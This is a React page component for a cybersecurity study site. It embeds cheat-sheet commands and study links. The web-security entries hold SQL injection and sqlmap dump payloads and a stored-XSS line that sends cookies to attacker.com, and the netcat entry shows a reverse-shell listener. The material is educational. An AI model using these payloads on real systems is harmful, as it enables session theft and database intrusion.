import { useState, useMemo, useRef, useEffect } from 'react';
import axios from 'axios';
import { API_URL as API } from '../config';

const CATEGORIES = [
  { key: 'all', label: 'All Resources', color: '#00F5FF', icon: '📚' },
  { key: 'linux', label: 'Linux Basics', color: '#FFD60A', icon: '🐧' },
  { key: 'network', label: 'Network Scanning', color: '#39FF14', icon: '🌐' },
  { key: 'web', label: 'Web Security', color: '#FF2D55', icon: '🔗' },
  { key: 'crypto', label: 'Cryptography', color: '#7C3AED', icon: '🔐' },
  { key: 'reverse', label: 'Reverse Engineering', color: '#FF8C00', icon: '🔍' },
  { key: 'forensics', label: 'Forensics', color: '#00F5FF', icon: '🔎' },
  { key: 'study', label: 'Study Resources', color: '#39FF14', icon: '🎓' },
];

const FALLBACK_RESOURCES = [
  // ─── LINUX ──────────────────────────────────────────────────────────────
  {
    id: 'linux-1', category: 'linux', title: 'File System Navigation',
    desc: 'Essential commands to navigate and manage the Linux file system.',
    code: `pwd                     # Print working directory
ls -la                  # List files with details
cd /path/to/dir         # Change directory
mkdir -p dir1/dir2      # Create nested directories
rm -rf folder/          # Force remove folder
cp file1 file2          # Copy file
mv file1 /new/path/     # Move/rename file
chmod +x script.sh      # Make script executable
chown user:group file   # Change file owner`,
  },
  {
    id: 'linux-2', category: 'linux', title: 'Process & System Info',
    desc: 'Monitor processes, system resources, and user activity.',
    code: `ps aux                 # Show all running processes
top                    # Real-time process viewer
htop                   # Enhanced top (install first)
kill -9 PID            # Force kill process
whoami                 # Current user
id                     # User & group IDs
uname -a               # Full system info
df -h                  # Disk space usage
free -h                # RAM usage
lscpu                  # CPU information
uptime                 # System uptime`,
  },
  {
    id: 'linux-3', category: 'linux', title: 'Text Processing',
    desc: 'Powerful text manipulation commands for log analysis and data extraction.',
    code: `cat file.txt           # Print file contents
less file.txt          # Page through file
head -20 file.txt      # First 20 lines
tail -f file.txt       # Follow file (live)
grep 'pattern' file    # Search text
grep -r 'text' ./      # Recursive search
sed 's/old/new/g' f    # Find & replace
awk '{print $2}' f     # Print 2nd column
wc -l file.txt         # Count lines
sort -u file.txt       # Sort unique
cut -d',' -f1 file     # CSV first column`,
  },
  {
    id: 'linux-4', category: 'linux', title: 'Networking on Linux',
    desc: 'Basic networking commands for troubleshooting and exploration.',
    code: `ip addr               # Show IP addresses
ip route              # Show routing table
ping -c 4 8.8.8.8     # Ping test
traceroute google.com # Trace network path
netstat -tulpn        # Listening ports (older)
ss -tulpn             # Listening ports (newer)
dig example.com       # DNS lookup
nslookup example.com  # DNS lookup (alt)
host example.com      # Simple DNS
curl -I example.com   # Fetch HTTP headers`,
  },

  // ─── NETWORK SCANNING ───────────────────────────────────────────────────
  {
    id: 'net-1', category: 'network', title: 'Nmap Basics',
    desc: 'Network Mapper — the standard tool for port scanning and service discovery.',
    code: `nmap -sn 192.168.1.0/24     # Ping sweep (find live hosts)
nmap 192.168.1.1             # Default scan (1000 ports)
nmap -p- 10.0.0.1            # Scan all 65535 ports
nmap -p 22,80,443 target     # Scan specific ports
nmap -sV target               # Service version detection
nmap -O target                # OS fingerprinting
nmap -A target                # Aggressive (OS + services + scripts)
nmap -sC target               # Run default scripts
nmap --script vuln target     # Vulnerability scan
nmap -sU target               # UDP scan`,
  },
  {
    id: 'net-2', category: 'network', title: 'Netcat & Network Tools',
    desc: 'Swiss-army knife for network connections and debugging.',
    code: `nc -lvnp 4444            # Listen on port 4444 (reverse shell)
nc 10.0.0.1 4444           # Connect to port 4444
nc -zv target 1-1000       # Verbose port scan
curl ifconfig.me           # Get public IP
tcpdump -i eth0            # Capture packets
tcpdump -i eth0 port 80    # Capture HTTP traffic
tcpdump -w capture.pcap    # Write to file
arp -a                     # Show ARP table
iwconfig                   # WiFi info
ss -tulpn                  # All listening services`,
  },
  {
    id: 'net-3', category: 'network', title: 'Wireshark / tshark',
    desc: 'Packet analysis — critical for network forensics and CTF challenges.',
    code: `tshark -r capture.pcap                      # Read PCAP
tshark -r capture.pcap -Y "http"           # Filter HTTP
tshark -r capture.pcap -Y "ip.addr==X.X.X.X" # Filter by IP
tshark -r capture.pcap -T fields -e http.host  # Extract hosts
tshark -r capture.pcap -z io,stat,1       # Stats
# Wireshark display filters (GUI):
# http.request == GET
# tcp.port == 80
# !(arp)
# follow TCP stream`,
  },

  // ─── WEB SECURITY ──────────────────────────────────────────────────────
  {
    id: 'web-1', category: 'web', title: 'cURL for Web Testing',
    desc: 'Essential HTTP requests manipulation for web security testing.',
    code: `curl -X GET http://target.com/api    # GET request
curl -X POST -d "user=admin" URL         # POST data
curl -X PUT -d '{"key":"val"}' -H "Content-Type: application/json" URL
curl -b "session=abc123" URL             # Send cookies
curl -c cookies.txt URL                   # Save cookies
curl -A "Mozilla/5.0" URL                # Custom User-Agent
curl -H "Authorization: Bearer TOKEN" URL # Auth header
curl -i URL                               # Include headers in output
curl -v URL                               # Verbose debug
curl -L URL                               # Follow redirects
curl -o output.html URL                   # Save to file`,
  },
  {
    id: 'web-2', category: 'web', title: 'SQL Injection Basics',
    desc: 'Common SQL injection payloads and testing techniques.',
    code: `# Basic test payloads:
' OR '1'='1
' OR 1=1 --
admin' --
' UNION SELECT 1,2,3 --
' UNION SELECT table_name FROM information_schema.tables --

# SQLMap (automated):
sqlmap -u "http://target.com/page?id=1" --batch
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# Blind SQLi:
' AND SLEEP(5) --
' AND 1=1 --  (true)
' AND 1=2 --  (false)`,
  },
  {
    id: 'web-3', category: 'web', title: 'XSS & Web Exploitation',
    desc: 'Cross-Site Scripting (XSS) payloads and testing methods.',
    code: `# Reflected XSS:
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Stored XSS:
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

# DOM-based XSS:
#javascript:alert(1)

# Directory busting:
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt

# Subdomain enumeration:
gobuster dns -d target.com -w subdomains.txt
ffuf -u http://FUZZ.target.com -w subdomains.txt`,
  },
  {
    id: 'web-4', category: 'web', title: 'Burp Suite & Proxies',
    desc: 'Intercepting web traffic for analysis and manipulation.',
    code: `# Setup browser to use proxy
Proxy: 127.0.0.1:8080 (Burp Suite default)

# Repeater - resend/modify requests
# Intruder - brute force / fuzzing
# Decoder - URL/Base64/Hex decode
# Comparer - diff two responses

# Alternative: OWASP ZAP (free)
# Alternative: mitmproxy (CLI-based)

# CLI proxy:
mitmproxy --mode transparent --listen-port 8080`,
  },

  // ─── CRYPTOGRAPHY ─────────────────────────────────────────────────────
  {
    id: 'crypto-1', category: 'crypto', title: 'Hash & Encoding Tools',
    desc: 'Identify and decode/dehash various cryptographic formats.',
    code: `# Identify hash type:
hashid '5d41402abc4b2a76b9719d911017c592'
hash-identifier

# Common hashes:
echo -n "text" | md5sum
echo -n "text" | sha1sum
echo -n "text" | sha256sum

# Base64:
echo "dGVzdA==" | base64 -d         # Decode
echo -n "test" | base64              # Encode

# Hex:
echo "74657374" | xxd -r -p          # Hex to text
echo -n "test" | xxd -p              # Text to hex

# John the Ripper:
john --wordlist=rockyou.txt hash.txt
john --show hash.txt

# Hashcat:
hashcat -m 0 -a 0 hash.txt rockyou.txt`,
  },
  {
    id: 'crypto-2', category: 'crypto', title: 'Classic Ciphers & Tools',
    desc: 'Classical cryptography techniques found in CTF challenges.',
    code: `# ROT13 / Caesar cipher:
echo "uryyb" | tr 'a-z' 'n-za-m'      # ROT13 decode
echo "khoor" | tr 'a-z' 'x-za-w'      # Caesar +3

# ROT47 (used in CTFs often):
# Use: https://rot47.net
# Or: echo "DECODETHIS" | caesar 47

# Vigenère cipher:
# Use: https://www.dcode.fr/vigenere-cipher

# Morse code:
... --- ...          # SOS

# Binary / ASCII:
01101000 01101001    # "hi" in binary

# CyberChef (THE Swiss army knife):
# https://gchq.github.io/CyberChef/`,
  },
  {
    id: 'crypto-3', category: 'crypto', title: 'RSA & Modern Crypto',
    desc: 'RSA decryption tools and techniques for CTF challenges.',
    code: `# RSA Tool (RsaCtfTool):
python3 RsaCtfTool.py -n N -e e --private
python3 RsaCtfTool.py -p p -q q -e e -n N

# Openssl RSA:
openssl rsa -pubin -in key.pub -text -noout
openssl rsautl -decrypt -inkey private.pem -in encrypted.enc

# Common weaknesses:
# - Small e (e=3, cube root attack)
# - Fermat factorization (close primes)
# - Wiener attack (small d)
# - Shared primes (GCD attack)

# Use dcode.fr RSA tool for quick analysis`,
  },

  // ─── REVERSE ENGINEERING ──────────────────────────────────────────────
  {
    id: 'rev-1', category: 'reverse', title: 'Binary Analysis Tools',
    desc: 'Tools for analyzing and reverse engineering compiled binaries.',
    code: `# Strings (find readable text):
strings binary              # Extract strings
strings -n 6 binary        # Strings min length 6

# File info:
file binary                 # Identify file type
exiftool binary             # EXIF/metadata

# Binutils:
objdump -d binary          # Disassemble
objdump -t binary          # Symbol table
readelf -a binary          # ELF details (Linux)
nm binary                  # Symbol names

# xxd / hexdump:
xxd binary | head -20      # Hex view
hexdump -C binary | head   # Canonical hex

# strace / ltrace:
strace -f ./binary         # System calls
ltrace ./binary            # Library calls`,
  },
  {
    id: 'rev-2', category: 'reverse', title: 'Disassemblers & Debuggers',
    desc: 'Advanced reverse engineering with industry-standard tools.',
    code: `# GDB (GNU Debugger):
gdb ./binary
gdb> info functions        # List functions
gdb> break main            # Break at main
gdb> run                   # Run program
gdb> x/20x $rip           # Examine memory
gdb> info registers        # Register state
gdb> disassemble main      # Disassemble function

# Ghidra (NSA tool - GUI):
# - Decompile to pseudo-C
# - Function graph view
# - Patch program

# IDA Pro (industry standard)
# radare2 / rizin (CLI):
r2 ./binary
[0x100001000]> aaa         # Analyze all
[0x100001000]> afl         # List functions
[0x100001000]> pdf @main   # Print disassembly`,
  },

  // ─── FORENSICS ────────────────────────────────────────────────────────
  {
    id: 'for-1', category: 'forensics', title: 'File Forensics',
    desc: 'Recover hidden data, analyze file structures, and carve artifacts.',
    code: `# Binwalk (firmware/embedded):
binwalk firmware.bin       # Scan for embedded files
binwalk -e firmware.bin    # Extract files

# Foremost (file carving):
foremost -i image.dd -o output/

# Steghide (image steganography):
steghide extract -sf image.jpg
steghide info image.jpg

# zsteg (LSB stego in PNG/BMP):
zsteg -a image.png         # All techniques

# Exiftool:
exiftool -a image.jpg      # All metadata

# Strings + grep:
strings image.jpg | grep -i flag
strings image.jpg | grep -i CSPHERE

# Binvis (visualize binary):
# https://binvis.io/`,
  },
  {
    id: 'for-2', category: 'forensics', title: 'Memory & Disk Forensics',
    desc: 'Analyze memory dumps, disk images, and log files.',
    code: `# Volatility (memory forensics):
volatility -f mem.dump imageinfo
volatility -f mem.dump --profile=Win10 pslist
volatility -f mem.dump --profile=Win10 netscan
volatility -f mem.dump --profile=Win10 cmdline
volatility -f mem.dump --profile=Win10 filescan

# Autopsy / Sleuth Kit:
fls -r disk.img            # List files
icat disk.img inode        # Read file by inode

# Log analysis:
grep "Failed password" /var/log/auth.log | wc -l
journalctl -u ssh.service  # SSH logs (systemd)
 
# PCAP analysis with tshark:
tshark -r capture.pcap -Y "http.request" -T fields -e http.host`,
  },

  // ─── STUDY RESOURCES ──────────────────────────────────────────────────
  {
    id: 'study-1', category: 'study', title: 'CTF Platforms',
    desc: 'Practice your skills on these cyber security challenge platforms.',
    code: null,
    links: [
      { name: 'Hack The Box', url: 'https://www.hackthebox.com', desc: 'Industry-standard CTF platform with realistic machines and challenges. Free tier available.' },
      { name: 'TryHackMe', url: 'https://tryhackme.com', desc: 'Beginner-friendly guided learning paths with browser-based labs.' },
      { name: 'PicoCTF', url: 'https://picoctf.com', desc: 'Free CTF platform by CMU, great for beginners with progressive difficulty.' },
      { name: 'CTFtime', url: 'https://ctftime.org', desc: 'Find upcoming CTF competitions and learn from past challenge writeups.' },
      { name: 'OverTheWire', url: 'https://overthewire.org', desc: 'Wargames teaching security concepts through SSH-based challenges (Bandit, Leviathan, etc.)' },
      { name: 'Root-Me', url: 'https://www.root-me.org', desc: 'Hundreds of challenges across all categories with a ranking system.' },
    ],
  },
  {
    id: 'study-2', category: 'study', title: 'Free Courses & Learning',
    desc: 'Online courses and learning paths to build cybersecurity skills from scratch.',
    code: null,
    links: [
      { name: 'Professor Messer (CompTIA)', url: 'https://www.professormesser.com', desc: 'Free video courses for Security+, Network+, and A+ certifications.' },
      { name: 'PortSwigger Web Security Academy', url: 'https://portswigger.net/web-security', desc: 'Free, comprehensive web security training with interactive labs (all OWASP topics).' },
      { name: 'Cybrary', url: 'https://www.cybrary.it', desc: 'Free cybersecurity courses across all domains — from beginner to advanced.' },
      { name: 'PicoCTF CyberStart', url: 'https://picoctf.org', desc: 'Interactive cybersecurity exercises designed for high school and college students.' },
      { name: 'Coursera — IBM Cybersecurity', url: 'https://www.coursera.org/professional-certificates/ibm-cybersecurity-analyst', desc: 'Professional certificate program covering SOC analyst skills.' },
      { name: 'MIT OCW — Computer Systems Security', url: 'https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/', desc: 'MIT\'s full computer systems security course, free with lecture videos and assignments.' },
    ],
  },
  {
    id: 'study-3', category: 'study', title: 'Must-Read Books',
    desc: 'Classic cybersecurity books every aspiring hacker should read.',
    code: null,
    links: [
      { name: 'The Web Application Hacker\'s Handbook', url: 'https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470', desc: 'The definitive guide to web application security testing.' },
      { name: 'The Hacker Playbook 3', url: 'https://www.amazon.com/Hacker-Playbook-Practical-Penetration-Testing/dp/1980901754', desc: 'Practical penetration testing methodology and techniques.' },
      { name: 'Practical Malware Analysis', url: 'https://www.amazon.com/Practical-Malware-Analysis-Hands-Dissecting/dp/1593272901', desc: 'Hands-on guide to dissecting malicious software.' },
      { name: 'Red Team Field Manual (RTFM)', url: 'https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1075095211', desc: 'Quick-reference command cheatsheet for red team operations.' },
      { name: 'Grey Hat Hacking', url: 'https://www.amazon.com/Gray-Hat-Hacking-Ethical-Handbook/dp/1264268942', desc: 'Comprehensive ethical hacking handbook covering modern exploit techniques.' },
      { name: 'Blue Team Handbook', url: 'https://www.amazon.com/Blue-Team-Handbook-Condensed-Operations/dp/1791015571', desc: 'SOC operations, incident response, and threat hunting guide.' },
    ],
  },
  {
    id: 'study-4', category: 'study', title: 'Certifications Roadmap',
    desc: 'Industry-recognized certifications to boost your cybersecurity career.',
    code: null,
    links: [
      { name: 'CompTIA Security+', url: 'https://www.comptia.org/certifications/security', desc: 'Entry-level — foundational cybersecurity knowledge. Start here.' },
      { name: 'CEH (Certified Ethical Hacker)', url: 'https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/', desc: 'Intermediate — penetration testing methodology and tools.' },
      { name: 'OSCP (Offensive Security)', url: 'https://www.offsec.com/courses/pen-200/', desc: 'Advanced — hands-on penetration testing certification. Highly respected.' },
      { name: 'CISSP', url: 'https://www.isc2.org/Certifications/CISSP', desc: 'Advanced — management-level security certification.' },
      { name: 'SANS GIAC', url: 'https://www.giac.org', desc: 'Specialized certifications for forensics, incident response, pentesting, and more.' },
      { name: 'Certified Cloud Security Professional (CCSP)', url: 'https://www.isc2.org/Certifications/CCSP', desc: 'Cloud security certification — AWS/Azure/GCP security focus.' },
    ],
  },
  {
    id: 'study-5', category: 'study', title: 'Useful Tools & Cheatsheets',
    desc: 'Essential cybersecurity tools and quick-reference resources.',
    code: null,
    links: [
      { name: 'CyberChef', url: 'https://gchq.github.io/CyberChef/', desc: 'The Cyber Swiss Army Knife — encode/decode/encrypt/analyze anything in the browser.' },
      { name: 'GTFOBins', url: 'https://gtfobins.github.io', desc: 'Unix binaries that can be used for privilege escalation and breakout.' },
      { name: 'LOLBAS', url: 'https://lolbas-project.github.io', desc: 'Windows binaries for living-off-the-land attacks.' },
      { name: 'PayloadsAllTheThings', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings', desc: 'Massive collection of payloads and bypass techniques for all categories.' },
      { name: 'DevDocs', url: 'https://devdocs.io', desc: 'Offline-capable documentation browser for programming and web technologies.' },
      { name: 'ExplainShell', url: 'https://explainshell.com', desc: 'Paste any shell command and get a breakdown of what each part does.' },
    ],
  },
];

export default function Resources() {
  const [resources, setResources] = useState(FALLBACK_RESOURCES);
  const [activeCategory, setActiveCategory] = useState('all');
  const [expandedId, setExpandedId] = useState(null);
  const [copiedId, setCopiedId] = useState(null);
  const copyTimerRef = useRef(null);

  useEffect(() => {
    axios.get(`${API}/api/resources`)
      .then(r => { if (r.data && r.data.length) setResources(r.data); })
      .catch(() => {}); // keep fallback if backend is offline
    return () => { if (copyTimerRef.current) clearTimeout(copyTimerRef.current); };
  }, []);

  const filtered = useMemo(() => {
    if (activeCategory === 'all') return resources;
    return resources.filter(r => r.category === activeCategory);
  }, [activeCategory, resources]);

  const handleCopy = (id, text) => {
    try {
      navigator.clipboard.writeText(text);
    } catch {
      // Fallback for non-HTTPS environments
      const textarea = document.createElement('textarea');
      textarea.value = text;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
    }
    setCopiedId(id);
    if (copyTimerRef.current) clearTimeout(copyTimerRef.current);
    copyTimerRef.current = setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div style={{ paddingTop: 72, minHeight: '100vh', background: 'var(--black)' }}>
      {/* Header */}
      <div style={{
        background: 'linear-gradient(135deg, #0A0A0F 0%, #0D1117 50%, #0A0A0F 100%)',
        borderBottom: '1px solid #1f2937',
        padding: '2rem',
        position: 'relative', overflow: 'hidden',
      }}>
        {/* Background orbs */}
        <div style={{
          position: 'absolute', top: '-30%', right: '-10%', width: 400, height: 400,
          borderRadius: '50%', background: '#00F5FF08', filter: 'blur(80px)',
        }} />
        <div style={{
          position: 'absolute', bottom: '-20%', left: '-5%', width: 300, height: 300,
          borderRadius: '50%', background: '#7C3AED08', filter: 'blur(60px)',
        }} />

        <div style={{ maxWidth: 1200, margin: '0 auto', position: 'relative', zIndex: 1 }}>
          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 12, color: '#00F5FF', letterSpacing: 4, marginBottom: 12 }}>
            // CYBERSECURITY_RESOURCES
          </div>
          <h1 style={{ fontFamily: 'var(--font-display)', fontSize: 'clamp(2rem, 5vw, 3.5rem)', fontWeight: 900 }}>
            Common Commands & <span style={{ color: '#00F5FF' }}>Study Material</span>
          </h1>
          <p style={{ color: '#6B7280', marginTop: 12, maxWidth: 600, lineHeight: 1.7 }}>
            A curated collection of essential cybersecurity commands, tools, and learning resources
            for students at every level — from beginner to advanced.
          </p>
        </div>
      </div>

      {/* Category pills */}
      <div style={{
        maxWidth: 1200, margin: '0 auto', padding: '2rem 2rem 0',
        display: 'flex', gap: 8, flexWrap: 'wrap', justifyContent: 'center',
      }}>
        {CATEGORIES.map(cat => (
          <button
            key={cat.key}
            onClick={() => { setActiveCategory(cat.key); setExpandedId(null); }}
            style={{
              padding: '8px 18px',
              background: activeCategory === cat.key ? `${cat.color}20` : 'transparent',
              border: `1px solid ${activeCategory === cat.key ? `${cat.color}50` : '#1f2937'}`,
              borderRadius: 20, cursor: 'pointer', transition: 'all 0.2s',
              fontFamily: 'var(--font-mono)', fontSize: 12, letterSpacing: 1,
              color: activeCategory === cat.key ? cat.color : '#6B7280',
              display: 'flex', alignItems: 'center', gap: 6,
            }}
            onMouseEnter={e => { if (activeCategory !== cat.key) { e.currentTarget.style.color = '#E2E8F0'; e.currentTarget.style.borderColor = '#374151'; } }}
            onMouseLeave={e => { if (activeCategory !== cat.key) { e.currentTarget.style.color = '#6B7280'; e.currentTarget.style.borderColor = '#1f2937'; } }}
          >
            <span>{cat.icon}</span>
            <span>{cat.label}</span>
          </button>
        ))}
      </div>

      {/* Resources */}
      <div style={{ maxWidth: 1200, margin: '0 auto', padding: '2rem 2rem 4rem' }}>
        {filtered.length === 0 ? (
          <div style={{ textAlign: 'center', padding: '4rem 0', color: '#6B7280', fontFamily: 'var(--font-mono)', fontSize: 13 }}>
            No resources in this category yet.
          </div>
        ) : (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
            {filtered.map(resource => (                <div
                key={resource.id}
                role={resource.code ? 'button' : undefined}
                tabIndex={resource.code ? 0 : undefined}
                onKeyDown={resource.code ? (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); setExpandedId(expandedId === resource.id ? null : resource.id); } } : undefined}
                style={{
                  background: 'var(--card)', border: '1px solid #1f2937',
                  borderRadius: 12, overflow: 'hidden', transition: 'border-color 0.2s',
                  cursor: resource.code ? 'pointer' : 'default',
                  outline: 'none',
                }}
                onClick={() => resource.code && setExpandedId(expandedId === resource.id ? null : resource.id)}
                onMouseEnter={e => e.currentTarget.style.borderColor = '#374151'}
                onMouseLeave={e => e.currentTarget.style.borderColor = '#1f2937'}
              >
                <div style={{ padding: '1.2rem 1.5rem', display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: 16 }}>
                  <div style={{ flex: 1 }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 6 }}>
                      <span style={{
                        background: `${CATEGORIES.find(c => c.key === resource.category)?.color}15`,
                        color: CATEGORIES.find(c => c.key === resource.category)?.color,
                        borderRadius: 4, padding: '2px 8px',
                        fontFamily: 'var(--font-mono)', fontSize: 10, letterSpacing: 1,
                      }}>
                        {CATEGORIES.find(c => c.key === resource.category)?.label?.toUpperCase()}
                      </span>
                      {resource.code && (
                        <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: '#4B5563' }}>
                          {expandedId === resource.id ? '▲ CLICK TO COLLAPSE' : '▼ CLICK TO EXPAND'}
                        </span>
                      )}
                    </div>
                    <h3 style={{ fontFamily: 'var(--font-display)', fontSize: 16, fontWeight: 700, color: '#E2E8F0' }}>
                      {resource.title}
                    </h3>
                    <p style={{ color: '#6B7280', fontSize: 13, marginTop: 4, lineHeight: 1.5 }}>
                      {resource.desc}
                    </p>
                  </div>
                </div>

                {/* Code block (expandable) */}
                {resource.code && expandedId === resource.id && (
                  <div style={{ borderTop: '1px solid #1f2937', background: '#050508' }}>
                    <div style={{ display: 'flex', justifyContent: 'flex-end', padding: '8px 16px 0' }}>
                      <button
                        onClick={(e) => { e.stopPropagation(); handleCopy(resource.id, resource.code); }}
                        style={{
                          padding: '4px 12px', background: copiedId === resource.id ? '#39FF1420' : 'transparent',
                          border: `1px solid ${copiedId === resource.id ? '#39FF1450' : '#1f2937'}`,
                          borderRadius: 6, color: copiedId === resource.id ? '#39FF14' : '#6B7280',
                          fontFamily: 'var(--font-mono)', fontSize: 10, cursor: 'pointer',
                          transition: 'all 0.2s',
                        }}
                      >
                        {copiedId === resource.id ? '✓ COPIED' : '📋 COPY'}
                      </button>
                    </div>
                    <pre style={{
                      padding: '0 16px 16px', overflowX: 'auto',
                      fontFamily: '"JetBrains Mono", "Fira Code", "Cascadia Code", monospace',
                      fontSize: 13, lineHeight: 1.6, color: '#00F5FF',
                    }}>
                      <code>{resource.code}</code>
                    </pre>
                  </div>
                )}

                {/* Links (for study resources) */}
                {resource.links && expandedId === resource.id && (
                  <div style={{ borderTop: '1px solid #1f2937', padding: '1.2rem 1.5rem', background: '#050508' }}>
                    <div style={{ display: 'grid', gap: 12 }}>
                      {resource.links.map((link, idx) => (
                        <a
                          key={idx}
                          href={link.url}
                          target="_blank"
                          rel="noopener noreferrer"
                          style={{
                            display: 'block', textDecoration: 'none',
                            padding: '10px 14px', background: 'var(--card)',
                            border: '1px solid #1f2937', borderRadius: 8,
                            transition: 'all 0.2s',
                          }}
                          onMouseEnter={e => { e.currentTarget.style.borderColor = '#00F5FF40'; e.currentTarget.style.background = '#0A0A0F'; }}
                          onMouseLeave={e => { e.currentTarget.style.borderColor = '#1f2937'; e.currentTarget.style.background = 'var(--card)'; }}
                        >
                          <div style={{ fontFamily: 'var(--font-display)', fontSize: 14, fontWeight: 600, color: '#00F5FF', marginBottom: 4 }}>
                            {link.name} ↗
                          </div>
                          <div style={{ fontFamily: 'var(--font-body)', fontSize: 12, color: '#6B7280', lineHeight: 1.5 }}>
                            {link.desc}
                          </div>
                        </a>
                      ))}
                    </div>
                  </div>
                )}

                {/* Auto-show links on load if study category */}
                {resource.links && activeCategory === 'study' && expandedId !== resource.id && (
                  <div style={{ borderTop: '1px solid #1f2937', padding: '1.2rem 1.5rem', background: '#050508' }}>
                    <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: '#4B5563', textAlign: 'center' }}>
                      Click to expand {resource.links.length} resources
                    </div>
                  </div>
                )}
              </div>
            ))}
          </div>
        )}

        {/* Footer note */}
        <div style={{
          marginTop: 40, textAlign: 'center',
          fontFamily: 'var(--font-mono)', fontSize: 11, color: '#374151',
          lineHeight: 1.7,
        }}>
          Resources are curated for educational purposes. Always practice on authorized systems.
          <br />
          Command output may vary based on your OS and installed tools.
        </div>
      </div>
    </div>
  );
}
